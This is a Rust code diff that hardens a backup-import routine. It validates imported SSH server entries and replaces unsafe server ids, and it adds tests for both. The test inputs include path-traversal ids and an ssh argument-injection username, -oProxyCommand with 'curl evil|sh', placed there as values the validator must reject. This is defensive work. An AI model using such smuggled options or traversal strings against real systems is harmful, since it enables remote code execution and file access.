@@ -2131,15 +2131,36 @@ async fn import_group(db: &Db, kind: GroupKind, entry: &GroupEntry) -> Result<Up
     Ok(outcome)
 }
 
+/// The checks of adding a server by hand: a backup is untrusted, and its username and host end
+/// up on the ssh command line.
+fn validate_vps_entry(entry: &VpsEntry) -> Result<(), String> {
+    // A managed key travels in the sealed secrets instead of as a path.
+    let sealed_key = entry.managed_key.then(|| "backup".to_string());
+    vps_servers::validate_payload(
+        &entry.label,
+        &entry.host,
+        &entry.username,
+        Some(entry.port),
+        &entry.auth_method,
+        &entry.private_key_path,
+        &sealed_key,
+    )
+    .map(|_| ())
+}
+
+/// The server id names its key folder, so a hint that is not a plain id gets a fresh one.
+async fn free_server_id(db: &Db, hint: &str) -> String {
+    let hint = if vps_servers::valid_server_id(hint) { hint } else { "" };
+    free_id(db, "servers", hint).await
+}
+
 async fn import_vps(
     app: &AppHandle,
     db: &Db,
     entry: &VpsEntry,
     secret: Option<&ServerSecretEntry>,
 ) -> Result<Upsert, String> {
-    if !matches!(entry.auth_method.as_str(), "agent" | "key") {
-        return Err("unknown auth method".to_string());
-    }
+    validate_vps_entry(entry)?;
     let local = sqlx::query("SELECT id, private_key_path FROM servers WHERE label = ? LIMIT 1")
         .bind(&entry.label)
         .fetch_optional(db)
@@ -2151,7 +2172,7 @@ async fn import_vps(
             row.get::<Option<String>, _>("private_key_path"),
             false,
         ),
-        None => (free_id(db, "servers", &entry.id).await, None, true),
+        None => (free_server_id(db, &entry.id).await, None, true),
     };
 
     // Managed key: restore it from the secrets, or keep whatever this machine already has.
@@ -3432,6 +3453,36 @@ mod tests {
             .unwrap();
         sqlx::migrate!("./migrations").run(&pool).await.unwrap();
         pool
+    }
+
+    /// A backup names the server id, which becomes the key folder name: a bad one gets a fresh id.
+    #[tokio::test]
+    async fn imported_server_keeps_only_a_plain_id() {
+        let db = test_db().await;
+        assert_eq!(free_server_id(&db, "srv-1").await, "srv-1");
+        for bad in ["../x", "/Users/x/Documents", "../../../../../..", "a/b"] {
+            let id = free_server_id(&db, bad).await;
+            assert!(Uuid::parse_str(&id).is_ok(), "{bad:?} must get a fresh id, got {id:?}");
+        }
+    }
+
+    #[test]
+    fn imported_server_rows_are_validated() {
+        let entry = |username: &str, host: &str| VpsEntry {
+            id: "srv-1".into(),
+            label: "prod".into(),
+            host: host.into(),
+            port: 22,
+            username: username.into(),
+            auth_method: "key".into(),
+            private_key_path: None,
+            managed_key: true,
+            tags: None,
+        };
+        assert!(validate_vps_entry(&entry("deploy", "example.com")).is_ok());
+        assert!(validate_vps_entry(&entry("-oProxyCommand=sh -c 'curl evil|sh' #", "example.com")).is_err());
+        assert!(validate_vps_entry(&entry("deploy", "-oX")).is_err());
+        assert!(validate_vps_entry(&VpsEntry { port: 0, ..entry("deploy", "example.com") }).is_err());
     }
 
     #[tokio::test]
